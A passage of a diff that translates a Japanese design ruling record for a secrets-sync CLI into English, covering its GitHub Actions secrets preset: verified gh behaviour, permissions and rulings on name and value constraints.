-Vercel)での http / `ci sync` の通し、Vercel の一覧のページ分け、macOS のパイプ容量、`vercel env rm` の不在名、SY3 の workflow 2 本の
-実機、Free / Pro / Team の private リポジトリの required reviewers、文言の好み。
+**Handoff to SY5 onward (SY4 wave 1 complete)**: (1) **SY5** `gh secret set` — stage 1 = the recipe (same ```sh + `recipes.test.ts` fake `gh` as Deploy targets' recipes), stage 2 = a step added to standard form ②'s `maruhi-sync.yml`. **Rides on the exec preset's declaration alone** (`gh secret set NAME` = raw-value / one at a time / `GH_TELEMETRY=false`). http needs libsodium sealing for GitHub's secrets API so **`http: {unavailable: …}`** (uses ruling A's shape as-is — the preset-side type is already prepared). Stage 3's `GH_ENV` / `ghArgument` are reusable. The bootstrap token (a fine-grained PAT or App token — supplement 8 Q1) is the sole exception to the "empty GitHub secrets" goal. (2) **SY4's remainder** (Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages) is demand-driven. With `create-or-update` / `lookup` generalized, almost any REST destination rides on declarations. GraphQL (Railway / Fly.io) is expressible via `contentType` + a `body` template but needs a response reader (`ResponseKind`). (3) A small generalization printing `context` (Netlify) on `describeDestination`'s header line (giving presets a `describe`), the `runBatches` "refused the request" wording (also attaches on retry exhaustion — revision 5's nit), and exec's `runInvocations` shape where a later start failure drops the earlier portion from the receipt (same shape as revision 5. Start failures usually happen on the first one) — all touch sync-plan.ts, so next occasion. (4) Netlify's `scopes` option (an array-type `OptionSpec`) when demand appears. (5) A real Netlify-account run (the "could not confirm" list above). (6) Existing carried-over items: `gh workflow run` on a real machine, Windows executable resolution, http / `ci sync` on real accounts (Cloudflare / Vercel), Vercel listing pagination, macOS pipe capacity, `vercel env rm`'s missing name, SY3's 2 workflows on a real repo, required reviewers on Free / Pro / Team private repos, wording preferences.
 
 ---
 
-### SY5 実装時の裁定録(2026-09-08)
+### SY5 implementation-time ruling record (2026-09-08)
 
-対象は ROADMAP **SY5** = GitHub Actions secrets(案 S6 の部品 — 補足 5 G1 / G2)。第 1 段 = レシピ(docs のみ)、第 2 段 = exec
-プリセット + 標準形 ② への同期(CI)。設計は確定済みで蒸し返していない: 補足 5 の結論(ネイティブ封印 = libsodium 系の依存追加は
-不要。G1 + G2 で手動と自動が依存追加なしに揃う)、補足 8 Q2(目標は「GitHub secrets を空にする」)/ Q3(既製アクションは
-`maruhi ci run -- <vendor cli>` へ)、補足 10 V1 / 補足 11(GitHub は `gh` をドライバとする同期先の 1 つで特別扱いなし)、
-補足 16(手元は exec を先に使う)。出発点は SY4 の申し送り (1)(「exec プリセットの宣言だけで載る」「http は `{unavailable}`」
-「第 3 段の `GH_ENV` / `ghArgument` を流用可」「bootstrap トークンは唯一の例外」)。各裁定点は同じループ(3 案以上 → 上位互換の
-探索 → 新案が出ない周で終了 → 理由付きで選定)で決め、「新案なし」の周では壊れ方(末尾改行の消失・空 stdin・48 KB・名前の規則と
-大文字小文字の同一視・不在 Environment・`-R` 省略時の行き先・bootstrap の権限の境界・`GH_TOKEN` の優先順位・入れ子・同じ workflow
-が自分の secrets を書く再帰・不在名の delete・`runInvocations` の失敗の形)を問うた。**申し送り (1) の「宣言だけで載る」は 3/4 だけ
-成り立った**: 宣言 1 つで載ったが、gh の `TrimRight`(複数行でも末尾改行を全部落とす)と GitHub の名前の規則(大文字で保存 =
-大小を同一視)は既存の `ValueConstraints` では表せず、**型を広げた**(全プリセットに効く一般化 — 裁定 C。gh 専用コードは
-`buildInvocations` / `runInvocations` / `sync-plan.ts` に足していない。sync-plan.ts は無変更)。
+The target is ROADMAP **SY5** = GitHub Actions secrets (a part of option S6 — supplement 5 G1 / G2). Stage 1 = the recipe (docs only); stage 2 = the exec preset + sync into standard form ② (CI). The design is settled and not re-litigated: supplement 5's conclusion (native sealing = no libsodium-family dependency needed. G1 + G2 align manual and automatic with no dependency additions), supplement 8 Q2 (the goal is "empty GitHub secrets") / Q3 (off-the-shelf actions → `maruhi ci run -- <vendor cli>`), supplements 10 V1 / 11 (GitHub is one of the `gh`-driven destinations, no special treatment), supplement 16 (local uses exec first). The starting point is SY4's handoff (1) ("rides on the exec preset's declaration alone", "http is `{unavailable}`", "stage 3's `GH_ENV` / `ghArgument` are reusable", "the bootstrap token is the sole exception"). Each ruling point was decided by the same loop (3+ options → search for a superset → end on a no-new-option round → choose with reasons), and on "no new option" rounds we asked about failure modes (trailing-newline loss, empty stdin, 48 KB, the name rule and case-folding, absent Environments, the destination when `-R` is omitted, bootstrap's permission boundary, `GH_TOKEN` precedence, nesting, recursion where the same workflow writes its own secrets, delete on an absent name, `runInvocations`' failure shape). **Handoff (1)'s "rides on the declaration alone" held only 3/4**: it did ride on one declaration, but gh's `TrimRight` (strips all trailing newlines even multi-line) and GitHub's name rule (stored uppercase = case-insensitive) couldn't be expressed by the existing `ValueConstraints`, so **the types were widened** (a generalization benefiting all presets — ruling C. No gh-specific code was added to `buildInvocations` / `runInvocations` / `sync-plan.ts`. sync-plan.ts is unchanged).
 
-**前提の確認(実物・公式 docs で確かめた事実。日付はすべて 2026-09-08)**:
-(1) **gh の版**: 最新リリースは **v2.100.0(2026-09-03)** — SY1 の実測(2026-09-05)と同じ版。この環境の gh は 2.99.0(`--help` の
-確認に使い、stdin の読みは v2.100.0 タグと trunk の `pkg/cmd/secret/set/set.go` を取得して読んだ — `getBody` は両者で同一)。
-(2) **`gh secret set` の stdin**(`set.go` の `getBody`): `--body` が空 → `IO.CanPrompt()`(stdin と stdout が TTY かつ
-`GH_PROMPT_DISABLED` 無し)ならパスワードプロンプト → それ以外は `io.ReadAll(stdin)` の後 **`bytes.TrimRight(body, "\r\n")`** =
-末尾の CR / LF を**すべて**落とす(複数行の値でも末尾の改行は残らない。Vercel の「1 行の値から 1 つだけ」とは違う。`"\n"` だけの
-値は空になる)。**空 stdin はエラーにならず**空の本文を `box.SealAnonymous` で封印して PUT する(API が空の secret を受理するかは
-**未確認** — 拒否なら gh の文面が出る。実測できない: この環境の gh トークンは `secrets: read` を持たず `--no-store` の公開鍵
-取得が 403)。順序: `BaseRepo()`(リポジトリの解決)→ `getSecretsFromOptions`(stdin を読む)→ 公開鍵取得 → `IsSupportedSecretEntity`
-の検査(**stdin を読んだ後**)→ 封印 → PUT。`-f -` は `godotenv.Parse`(dotenv 形式 — SY1 で JSON 一択にした理由がそのまま当たる)。
-(3) **リポジトリの解決**(`set.go` の `RunE`): `-R` / `GH_REPO` が無ければ cwd の git remote。remote が複数で対話できなければ
-`RequireNoAmbiguityBaseRepoFunc` が**エラー**(黙って片方を選ばない)。git リポジトリでなければ「failed to run git: fatal: not a
-git repository」で終了コード **1**(実測)。
-(4) **終了コード**(実測): 認証情報が全く無い = **4**(`gh auth login` / `GH_TOKEN` の案内。`workflow run` と同じ `exitAuth`)、
-不正なトークン = **1**(「failed to fetch public key: HTTP 401: Bad credentials」)。`gh secret delete` は
-`client.REST("DELETE", …)` の非 2xx をそのまま `failed to delete secret X: HTTP 404` で返す(`delete.go`)= **不在名は非 0** =
-Vercel の `env rm` の wart と同じ形(既存の `failDriver` のレシート作り直しの案内がそのまま当たる — 裁定 G)。
-(5) **`--app` と置き場の組み合わせ**(`shared.go` の `IsSupportedSecretEntity`): actions = repository / organization / environment、
-agents = repository / organization、codespaces = user / organization / repository、dependabot = repository / organization。
-**Environment secrets は actions だけ**。`--app` 省略 = actions(user なら codespaces)。
-(6) **GitHub の secrets の規則**(docs.github.com「Secrets reference」): 名前は英数字と `_`、空白不可、**`GITHUB_` 接頭辞で
-始まらない**、**数字で始まらない**、**参照は大文字小文字を区別せず、GitHub は名前を大文字で保存する**、同じ階層で一意。上限は
-**48 KB**(単位・測り方の記述なし)、リポジトリ 100 / Environment 100 / 組織 1,000。組織・リポジトリ secrets は run のキュー時に、
-Environment secrets は job 開始時に読まれる。「Using secrets」: 未設定の secret を参照した式は**空文字列**。
-(7) **権限**(REST docs の各エンドポイントの「Fine-grained access tokens」節): リポジトリ secrets の PUT / DELETE =
-**"Secrets" repository permissions (write)**(公開鍵の GET は read)、Environment secrets の PUT / DELETE = **"Environments"
-repository permissions (write)**(公開鍵は read)、Dependabot secrets = **"Dependabot secrets" (write)**。使えるトークンは
-GitHub App user access token / GitHub App installation access token / fine-grained PAT。**`GITHUB_TOKEN` は secrets を書けない**
-= workflow-syntax の `permissions` の鍵の一覧(actions / attestations / checks / contents / deployments / discussions / id-token /
-issues / packages / pages / pull-requests / security-events / statuses)に `secrets` も `environments` も**無い**(与える手段が無い)。
-(8) **gh の認証の優先順位**(`gh help environment`): `GH_TOKEN`、次いで `GITHUB_TOKEN`。保存済みの資格より環境変数が勝つ。
-**ランナーの既定の環境変数に `GITHUB_TOKEN` は無い**(docs「Store information in variables」の Default environment variables の
-一覧に無い。`${{ github.token }}` / `${{ secrets.GITHUB_TOKEN }}` は式でだけ得る)= step の `env: GH_TOKEN:` と競合するものは無い。
-(9) **テレメトリ**(`gh help environment` / `gh help config`): `GH_TELEMETRY=false|0`(`DO_NOT_TRACK` に優先)、`DO_NOT_TRACK=1|true`、
-恒久設定は **`gh config set telemetry disabled`**(`{enabled | disabled | log}`)。`GH_NO_UPDATE_NOTIFIER`(アップデート確認)、
-`GH_PROMPT_DISABLED`(対話)。
-(10) **GitHub Environment の自動作成**: workflow が参照すると作られる(SY3 前提 (2))が、`gh secret set --env X` は
-**`GET …/environments/X/secrets/public-key` を先に呼ぶ**(`getEnvPubKey`)。不在 Environment に対する応答は実測できず
-(**未確認** — 404 と推定)、docs は「gh は Environment を作らない(公開鍵を先に引く)ので先に作る」とだけ書いた。
-(11) **コード側**: `SyncPreset.exec / http` は `宣言 | {unavailable}`(SY4 裁定 A)、`PRESET_IDS`(sync-types.ts)が id の単一の正で
-レシートの許容値・`--preset` の検査は追随する(`--help` の文言は手書き = golden)。`ExecPreset` に `check` は無く(http には
-ある)、`OptionSpec` は `values`(閉集合)だけ。`checkValueConstraints`(sync-exec.ts)は apply の `prepareWork` から 1 変数ずつ
-呼ばれ、**名前**を受け取る(値の制約に名前の規則を載せる口はここにしかない — plan の `classifyVariable` は sync-plan.ts)。
-`buildChildEnvironment`(run.ts)は `MARUHI_*` だけを落とすので、step の `GH_TOKEN` は `maruhi ci sync` → gh へ届く。
+**Premise verification (facts confirmed against the real things / official docs. All dates 2026-09-08)**:
+(1) **gh's version**: the latest release is **v2.100.0 (2026-09-03)** — same version as SY1's measurement (2026-09-05). This environment's gh is 2.99.0 (used for `--help` checks; stdin reading was read from `pkg/cmd/secret/set/set.go` fetched at the v2.100.0 tag and trunk — `getBody` is identical in both).
+(2) **`gh secret set`'s stdin** (`set.go`'s `getBody`): empty `--body` → `IO.CanPrompt()` (stdin and stdout are TTY and no `GH_PROMPT_DISABLED`) gives a password prompt → otherwise after `io.ReadAll(stdin)`, **`bytes.TrimRight(body, "\r\n")`** = strips **all** trailing CR / LF (a multi-line value keeps no trailing newline. Unlike Vercel's "strips just one from a single-line value". A value that is only `"\n"` becomes empty). **Empty stdin isn't an error** — an empty body is sealed by `box.SealAnonymous` and PUT (whether the API accepts an empty secret is **unconfirmed** — if refused, gh's wording surfaces. Can't be measured: this environment's gh token lacks `secrets: read`, so `--no-store`'s public-key fetch is 403). Order: `BaseRepo()` (resolves the repo) → `getSecretsFromOptions` (reads stdin) → public-key fetch → `IsSupportedSecretEntity` check (**after reading stdin**) → seal → PUT. `-f -` is `godotenv.Parse` (dotenv format — the reason SY1 went JSON-only applies as-is).
+(3) **Repo resolution** (`set.go`'s `RunE`): without `-R` / `GH_REPO`, cwd's git remote. If remotes are multiple and it can't ask, `RequireNoAmbiguityBaseRepoFunc` **errors** (doesn't silently pick one). Outside a git repo: "failed to run git: fatal: not a git repository" with exit code **1** (measured).
+(4) **Exit codes** (measured): no credentials at all = **4** (guidance to `gh auth login` / `GH_TOKEN`. The same `exitAuth` as `workflow run`); an invalid token = **1** ("failed to fetch public key: HTTP 401: Bad credentials"). `gh secret delete` returns `client.REST("DELETE", …)`'s non-2xx as-is: `failed to delete secret X: HTTP 404` (`delete.go`) = **an absent name is nonzero** = same shape as Vercel's `env rm` wart (the existing `failDriver`'s receipt-rebuild guidance applies as-is — ruling G).
+(5) **`--app` × location combinations** (`shared.go`'s `IsSupportedSecretEntity`): actions = repository / organization / environment; agents = repository / organization; codespaces = user / organization / repository; dependabot = repository / organization. **Environment secrets are actions-only**. `--app` omitted = actions (codespaces if user).
+(6) **GitHub's secrets rules** (docs.github.com "Secrets reference"): names are alphanumerics and `_`, no spaces, **must not start with `GITHUB_`**, **must not start with a digit**, **references are case-insensitive and GitHub stores names in uppercase**, unique within the same level. Cap is **48 KB** (no units / measurement described); 100 per repo / 100 per Environment / 1,000 per org. Org / repo secrets are read at run-queue time; Environment secrets at job start. "Using secrets": an expression referencing an unset secret is an **empty string**.
+(7) **Permissions** (each REST-docs endpoint's "Fine-grained access tokens" section): repo secrets' PUT / DELETE = **"Secrets" repository permissions (write)** (public-key GET is read); Environment secrets' PUT / DELETE = **"Environments" repository permissions (write)** (public key is read); Dependabot secrets = **"Dependabot secrets" (write)**. Usable tokens: GitHub App user access token / GitHub App installation access token / fine-grained PAT. **`GITHUB_TOKEN` can't write secrets** = the workflow-syntax `permissions` key list (actions / attestations / checks / contents / deployments / discussions / id-token / issues / packages / pages / pull-requests / security-events / statuses) has **neither** `secrets` **nor** `environments` (there's no way to grant it).
+(8) **gh's auth precedence** (`gh help environment`): `GH_TOKEN`, then `GITHUB_TOKEN`. Env vars beat stored credentials. **The runner's default env vars don't include `GITHUB_TOKEN`** (absent from docs "Store information in variables"'s Default environment variables list. `${{ github.token }}` / `${{ secrets.GITHUB_TOKEN }}` are obtained only via expressions) = nothing competes with a step's `env: GH_TOKEN:`.
+(9) **Telemetry** (`gh help environment` / `gh help config`): `GH_TELEMETRY=false|0` (takes precedence over `DO_NOT_TRACK`), `DO_NOT_TRACK=1|true`; the persistent setting is **`gh config set telemetry disabled`** (`{enabled | disabled | log}`). `GH_NO_UPDATE_NOTIFIER` (update checks), `GH_PROMPT_DISABLED` (interactivity).
+(10) **GitHub Environment auto-creation**: one is created when a workflow references it (SY3 premise (2)), but `gh secret set --env X` **first calls `GET …/environments/X/secrets/public-key`** (`getEnvPubKey`). The response on an absent Environment couldn't be measured (**unconfirmed** — estimated 404); docs only wrote "gh doesn't create the Environment (it fetches the public key first), so create it first".
+(11) **Code side**: `SyncPreset.exec / http` are `declaration | {unavailable}` (SY4 ruling A); `PRESET_IDS` (sync-types.ts) is the single source of truth for ids and the receipt's allowed values / `--preset` check follow (`--help` wording is hand-written = golden). `ExecPreset` has no `check` (http does); `OptionSpec` only has `values` (closed sets). `checkValueConstraints` (sync-exec.ts) is called per variable from apply's `prepareWork` and **receives the name** (the only place to put name rules on the value constraint — plan's `classifyVariable` is in sync-plan.ts). `buildChildEnvironment` (run.ts) drops only `MARUHI_*`, so a step's `GH_TOKEN` reaches gh through `maruhi ci sync`.
 
-**操作 × 置き場 × 値の形 × 失敗(裁定 C〜G の入力。「未確認」は上の (2) / (10))**:
+**Operation × location × value shape × failure (input to rulings C–G. "Unconfirmed" is (2) / (10) above)**:
 
-| 操作 | repository(`-R` / cwd の remote) | environment(`--env`) | app(`--app`) | 値の形 | 失敗 |
+| Operation | repository (`-R` / cwd's remote) | environment (`--env`) | app (`--app`) | Value shape | Failure |
 |---|---|---|---|---|---|
-| `gh secret set NAME`(stdin) | 上書き(PUT)。remote が曖昧なら止まる・git 外なら 1 | actions のみ。公開鍵を先に引く(不在 = 未確認・作らない) | actions(既定)/ agents / codespaces / dependabot | `TrimRight("\r\n")`(全部)、空 = 空を送る(API 未確認)、48 KB(単位未確認・切り詰めの経路なし) | 未ログイン 4・401 / 403 / 404 は 1・名前の規則違反は API の拒否(gh は検査しない)|
-| `gh secret delete NAME` | 名前で消す(一覧不要) | 同上 | 同上 | — | 不在名 = HTTP 404 = 1(Vercel と同じ wart)|
-| 名前 | 英数字 `_`・数字始まり不可・`GITHUB_` 不可・**大文字で保存** = `Foo` と `FOO` は同じ secret(片方の delete が両方を消す) | 同上 | 同上 | — | — |
-| 権限(fine-grained PAT / App) | Secrets: write | Environments: write | Dependabot secrets: write(codespaces / agents は別の permission — docs では触れない) | — | `GITHUB_TOKEN` には与えられない |
+| `gh secret set NAME` (stdin) | overwrite (PUT). Stops on ambiguous remote; 1 outside git | actions only. Public key fetched first (absent = unconfirmed, doesn't create) | actions (default) / agents / codespaces / dependabot | `TrimRight("\r\n")` (all of them), empty = sends empty (API unconfirmed), 48 KB (unit unconfirmed, no truncation path) | not logged in = 4; 401 / 403 / 404 = 1; name-rule violations = API refusal (gh doesn't check) |
+| `gh secret delete NAME` | deletes by name (no listing needed) | same | same | — | absent name = HTTP 404 = 1 (same wart as Vercel) |
+| names | alphanumerics `_`, no leading digit, no `GITHUB_`, **stored uppercase** = `Foo` and `FOO` are the same secret (deleting one deletes both) | same | same | — | — |
+| permissions (fine-grained PAT / App) | Secrets: write | Environments: write | Dependabot secrets: write (codespaces / agents use a different permission — not covered in docs) | — | can't be granted to `GITHUB_TOKEN` |
 
-**A. 段割りと PR の切り方** — 列挙: (i) **第 1 段(レシピ)と第 2 段(プリセット + CI docs)を 1 本の PR** / (ii) 2 本(レシピを先に)
-/ (iii) 3 本(レシピ / プリセット / workflow の docs)。第 1 周の新案: なし。第 2 周(壊れ方): (ii) / (iii) は同じ 2 ページ
-(deploy-targets.mdx の「GitHub Actions secrets」節と「Without maruhi sync」節、github-actions.mdx の標準形 ②)を複数 PR が触り
-競合する(SY2 第 2 段の裁定 A′ と同じ論点)。レシピの `printenv | gh secret set` と exec プリセットの `gh secret set NAME` は
-同じ形で、片方だけ先に出すと末尾改行の注記(レシピ = 落ちる、プリセット = 拒む)が 2 回書き直しになる。(i) は差分が大きいが
-CLI の変更は宣言 1 つ + 型の一般化で、レビューの単位として読める(なし)。**選定 = (i)**(draft → ready)。棄却: (ii) / (iii)。
+**A. Stage split and PR shape** — enumeration: (i) **stage 1 (recipe) and stage 2 (preset + CI docs) in one PR** / (ii) 2 PRs (recipe first)
+/ (iii) 3 PRs (recipe / preset / workflow docs). Round-1 new option: none. Round 2 (failure modes): (ii) / (iii) have multiple PRs touching and contending on the same 2 pages (deploy-targets.mdx's "GitHub Actions secrets" section and "Without maruhi sync" section; github-actions.mdx's standard form ②) (same point as SY2 stage 2's ruling A′). The recipe's `printenv | gh secret set` and the exec preset's `gh secret set NAME` are the same shape, so shipping one first makes the trailing-newline note (recipe = lost, preset = refused) get written twice. (i) has a large diff, but the CLI change is one declaration + a type generalization — readable as a review unit (no). **Chosen = (i)** (draft → ready). Rejected: (ii) / (iii).
 
-**B. プリセット id と表現** — 列挙: (i) **`github-actions`** / (ii) `github` / (iii) `gh`。第 1 周の新案: なし。第 2 周(壊れ方):
-(iii) はコマンド名で同期先ではない(`wrangler` ではなく `cloudflare-workers` の規則)。(ii) は Dependabot / Codespaces secrets も
-書ける事実に近いが、docs のページ名・ROADMAP の項目名・「GitHub Actions secrets」という GitHub 自身の呼称と揃わない。(i) は
-`cloudflare-workers` と同じ「製品名」の規則で、`app: dependabot` は節の中のオプションとして自然に読める(なし)。**選定 = (i)**。
-`PRESET_IDS` の末尾に足す(表示順 = 追加順)。http の不在理由 = 「the github-actions preset has no http driver: the GitHub API
-takes the value sealed to the repository's public key with libsodium, which maruhi does not implement, so maruhi only drives the gh
-CLI」(Netlify の文と対称。`driver: "http"` を名指しした設定はこの文 + `use "exec"`、`sync init --driver http` は同じ文 +
-`use --driver exec`)。
+**B. The preset id and representation** — enumeration: (i) **`github-actions`** / (ii) `github` / (iii) `gh`. Round-1 new option: none. Round 2 (failure modes): (iii) is a command name, not a destination (the `wrangler`-not-`cloudflare-workers` rule). (ii) is close to the fact that Dependabot / Codespaces secrets can also be written, but doesn't align with the docs page name, the ROADMAP item name, or GitHub's own term "GitHub Actions secrets". (i) follows the same "product name" rule as `cloudflare-workers`, and `app: dependabot` reads naturally as an option inside the section (no). **Chosen = (i)**. Appended to `PRESET_IDS`'s tail (display order = addition order). http's unavailability reason = "the github-actions preset has no http driver: the GitHub API takes the value sealed to the repository's public key with libsodium, which maruhi does not implement, so maruhi only drives the gh CLI" (symmetric with Netlify's. A config explicitly naming `driver: "http"` gets this sentence + `use "exec"`; `sync init --driver http` gets the same sentence + `use --driver exec`).
 
-**C. exec 宣言の形と制約** — 宣言: `command: "gh"`、`env: GH_ENV`、`transport: "raw-value"` / `batch: 1`、`writeArgs: ["secret",
-"set", {name}, {option repo --repo}, {option environment --env}, {option app --app}]`、`delete: {args: ["secret", "delete", {name},
-…同じ 3 オプション]}`。**末尾改行**の列挙: (i) `ValueConstraints` に `refuseTrailingNewline: boolean` を足す(2 つの boolean で
-片方が他方を含む)/ (ii) 黙って落ちることを docs に書くだけ / (iii) gh 専用の検査 / (iv) 警告して送る。第 1 周の新案:
-**(v) `refuseSingleLineTrailingNewline` を 3 値の `trailingNewline: "kept" | "strippedFromSingleLine" | "stripped"` に置き換える**
-(あり — 「CLI の stdin の読み手が末尾改行に何をするか」を宣言が述べ、拒否はそこから導かれる。boolean 2 つの「片方が他方を含む」
-組み合わせが型から消える。Workers / Vercel / http 3 プリセットの宣言は機械的に写す。挙動不変)。第 2 周(壊れ方): (ii) は
-「maruhi が持つ値と違うものを届ける」を黙って許す(PEM の末尾改行は多くのパーサで無害だが、それを決めるのは maruhi ではない)。
-(iv) は届いた version をレシートに記録しながら内容が違う(レシートの意味が崩れる)。(iii) は規律違反。(v) で `"\n"` だけの値も
-拒まれる(空になる形を先に塞ぐ)(なし)。**選定 = (v)**。**空 stdin**の列挙: (a) `nonEmpty: true`(Vercel と同じ文面「treats an
-empty value on stdin as no value」— gh には**当たらない**: gh は空を送る)/ (b) **`nonEmpty: false`**(gh に渡す。API の受理は
-未確認だが、拒否なら gh の文面で見える = fail-visible。切り詰めや無言の変形は無い)/ (c) 文面を一般化して拒む。第 1 周: なし。
-第 2 周: (a) は嘘の文面、(c) は「maruhi の空は同期先でも空」という wrangler と同じ意味論を gh でだけ曲げる(なし)。**選定 = (b)**。
-**48 KB** の列挙: (a) `maxBytes: 48 * 1024` / (b) `48_000` / (c) **`null`**。周: 単位も測る対象(平文か封印後の base64 か)も
-docs に無く(前提 (6))、`maxBytes` の拒否文面は「it reads only the first chunk of stdin, so a larger value could be cut off
-silently」= Vercel の切り詰めの話で gh には当たらない(gh は全部読む)。gh には切り詰めの経路が無く、超過は API の拒否として
-gh の文面で見える → **未確認の数に実装を依存させない**(なし)。**選定 = (c)** + docs で「48 KB は GitHub の上限。maruhi は
-検査せず gh が API の拒否を報告する」。**名前の規則**の列挙: (a) 検査しない(API が拒む — ただし**大文字小文字の同一視は API も
-拒まない** = `foo` と `FOO` が 1 secret に畳まれ、片方の rename で `- foo` の delete が `FOO` を消す**無言の破壊**)/ (b)
-`ValueConstraints.name = {regex, rule}` で英数字・`_`・数字始まり不可・`GITHUB_` 不可を 1 変数ずつ検査し、大小の衝突は docs に
-書く / (c) 選択全体で大小の衝突を検査する(**集合が要る** = `prepareWork` か `computePlan` = sync-plan.ts — 所有者確認事項)/
-(d) **(b) の regex を大文字だけにする**(`^(?!GITHUB_)[A-Z_][A-Z0-9_]*$`)。第 1 周の新案: (d)(あり — maruhi の名前は環境内で
-一意なので、全部大文字なら大小を畳んでも一意 = 衝突と rename の破壊が**構造で**起きない。1 変数ずつの検査で足り、sync-plan.ts を
-触らない。代償は小文字混じりの maruhi 名を「rename せよ」と拒むこと — GitHub 自身がそれを大文字に変えて保存する以上「maruhi が
-持つ名前がそのまま届く」ものだけを通すのは他の制約と同じ規律)。第 2 周(壊れ方): (a) は無言の破壊、(c) は sync-plan.ts、(b) だけ
-では rename の破壊が残る。`maruhi run` は既に大小違いの名前の同居を拒む(Windows)ので (d) の代償に当たる利用者は少ない(なし)。
-**選定 = (d)**。文面は「Variable X has a name the gh CLI cannot store as is: GitHub stores secret names in uppercase and accepts
-only …」(名前だけを運ぶ)。plan には出ない(内容の制約と同じく apply で全件検査 → 1 件でも駄目なら「Nothing was sent」— 第 1 段の
-裁定 P の線)。**オプションの形**: `repo` は gh の `[HOST/]OWNER/REPO` の形を `OptionSpec.pattern`(新設 — `{regex, hint}`)で
-検査し、`environment` は先頭 `-` を除く(第 3 段の `ghArgument` と同じ理由 — フラグと読まれる形を設定で作らせない。`ghArgument`
-自体は workflow の `file` / `ref` 用の関数で、宣言のデータにはならないため `pattern` に一般化した)。`app` は閉集合(前提 (5))。
-**`environment` × `app`** の整合(Environment secrets は actions のみ)は `OptionSpec` では表せない → **`ExecPreset.check`**(http の
-`check` と同じ契約)を足し、sync-config.ts の呼び出しをドライバ種別に依らない形にした(gh は stdin を読んだ**後**にこれを拒む
-〔前提 (2) の順序〕ので、設定の段階で止める)。
+**C. The exec declaration's shape and constraints** — declaration: `command: "gh"`, `env: GH_ENV`, `transport: "raw-value"` / `batch: 1`, `writeArgs: ["secret", "set", {name}, {option repo --repo}, {option environment --env}, {option app --app}]`, `delete: {args: ["secret", "delete", {name}, …same 3 options]}`. **Trailing newline** enumeration: (i) add `refuseTrailingNewline: boolean` to `ValueConstraints` (2 booleans where one subsumes the other) / (ii) only write in docs that it silently drops / (iii) a gh-specific check / (iv) warn and send. Round-1 new option: **(v) replace `refuseSingleLineTrailingNewline` with a 3-value `trailingNewline: "kept" | "strippedFromSingleLine" | "stripped"`** (available — the declaration states "what the CLI's stdin reader does to a trailing newline" and refusal is derived from it. The 2-boolean "one subsumes the other" combination disappears from the type. The Workers / Vercel / http-3 presets' declarations are transcribed mechanically. Behavior unchanged). Round 2 (failure modes): (ii) silently allows "delivering something different from what maruhi holds" (a PEM's trailing newline is harmless to most parsers, but deciding that isn't maruhi's). (iv) records the delivered version on the receipt while the content differs (breaks the receipt's meaning). (iii) violates the discipline. Under (v), a value that is only `"\n"` is also refused (closes the becomes-empty shape up front) (no). **Chosen = (v)**. **Empty stdin** enumeration: (a) `nonEmpty: true` (same wording as Vercel "treats an empty value on stdin as no value" — **doesn't apply** to gh: gh sends empty) / (b) **`nonEmpty: false`** (pass it to gh. API acceptance is unconfirmed, but a refusal surfaces via gh's wording = fail-visible. No truncation or silent transformation) / (c) generalize the wording and refuse. Round 1: none. Round 2: (a) is a false wording; (c) bends the wrangler-equivalent semantics "empty in maruhi = empty at the destination" only for gh (no). **Chosen = (b)**. **48 KB** enumeration: (a) `maxBytes: 48 * 1024` / (b) `48_000` / (c) **`null`**. Rounds: neither the unit nor what's measured (plaintext vs sealed base64) is in the docs (premise (6)), and `maxBytes`'s refusal wording is "it reads only the first chunk of stdin, so a larger value could be cut off silently" = Vercel's truncation story, which doesn't apply to gh (gh reads everything). gh has no truncation path and an excess surfaces as an API refusal in gh's wording → **don't make the implementation depend on an unconfirmed number** (no). **Chosen = (c)** + docs say "48 KB is GitHub's cap. maruhi doesn't check; gh reports the API's refusal". **Name rules** enumeration: (a) don't check (the API refuses — but **case-folding isn't refused by the API either** = `foo` and `FOO` fold into 1 secret, and renaming one makes `- foo`'s delete erase `FOO` — **silent destruction**) / (b) `ValueConstraints.name = {regex, rule}` checks per-variable: alphanumerics, `_`, no leading digit, no `GITHUB_`; the case collision goes in docs / (c) check case collisions across the whole selection (**needs a set** = `prepareWork` or `computePlan` = sync-plan.ts — an owner-confirmation item) / (d) **make (b)'s regex uppercase-only** (`^(?!GITHUB_)[A-Z_][A-Z0-9_]*$`). Round-1 new option: (d) (available — maruhi's names are unique within an environment, so all-uppercase stays unique even under case-folding = the collision and rename destruction **structurally can't happen**. A per-variable check suffices, and sync-plan.ts isn't touched. The cost is refusing lowercase-containing maruhi names with "rename them" — since GitHub itself stores them uppercased, passing only "the name maruhi holds arrives as-is" is the same discipline as the other constraints). Round 2 (failure modes): (a) is silent destruction; (c) is sync-plan.ts; (b) alone leaves rename destruction. `maruhi run` already refuses coexisting case-differing names (Windows), so few users would hit (d)'s cost (no). **Chosen = (d)**. The wording is "Variable X has a name the gh CLI cannot store as is: GitHub stores secret names in uppercase and accepts only …" (carries only the name). It doesn't surface on plan (like content constraints, everything is checked at apply → if even one fails, "Nothing was sent" — stage 1 ruling P's line). **Option shapes**: `repo` is checked via `OptionSpec.pattern` (new — `{regex, hint}`) against gh's `[HOST/]OWNER/REPO` shape; `environment` refuses leading `-` (same reason as stage 3's `ghArgument` — don't let config build a flag-readable shape. `ghArgument` itself is a function for a workflow's `file` / `ref`, not declaration data, so it was generalized into `pattern`). `app` is the closed set (premise (5)). **`environment` × `app` consistency** (Environment secrets are actions-only) can't be expressed via `OptionSpec` → added **`ExecPreset.check`** (same contract as http's `check`), and sync-config.ts's call was made driver-kind-agnostic (gh refuses this **after** reading stdin〔premise (2)'s order〕, so it's stopped at the config stage).
 
-**D. オプションと production の既定** — `repo` の列挙: (i) 必須 / (ii) **省略可(gh が cwd の git remote から解く。曖昧なら gh が
-止まる)** / (iii) 省略可 + `sync init` で note。第 1 周の新案: なし。第 2 周(壊れ方): (i) は「設定がコミットされているリポジトリ
-自身に書く」という最も普通の形で `OWNER/REPO` を重複して書かせる。(ii) の「平文の行き先が cwd で変わる」は Vercel の linked
-directory / wrangler の設定ファイルと同じ既存の規律(設定の `cwd` は設定ファイルからの相対、`Running gh in <cwd>` を出力に残す)で、
-fork のクローンで打てば fork に書くが、書けるのは書き手のログインで書ける先だけ。remote が複数なら gh は黙って選ばない(前提 (3))
-(なし)。**選定 = (ii)**、docs で「without it gh uses the git remote of the directory it runs in, and stops if that directory has
-several remotes」。**`environment`**: GitHub Environment(`--env`)。Vercel の `environment` と「デプロイ環境」の同じ意味なので同じ
